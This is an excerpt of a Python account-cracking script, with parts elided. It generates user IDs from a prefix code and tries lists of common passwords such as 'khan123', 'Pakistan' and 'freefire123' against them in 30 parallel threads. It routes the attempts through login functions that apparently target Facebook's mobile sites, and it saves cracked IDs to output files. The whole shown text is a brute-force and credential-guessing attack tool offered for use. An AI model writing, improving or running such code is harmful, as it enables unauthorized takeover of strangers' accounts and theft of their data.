...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/Mr-Azan/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
def xerx1():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [uid+guru,'khan123','khan12345','free fire','i love you','freefire123']
...
def xerx4():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'Pakistan','first last','free fire','Free Fire','i love you','freefire123']
			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
	...
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in AXB-OK.txt,AXBCP.txt')
	print(47*"-")
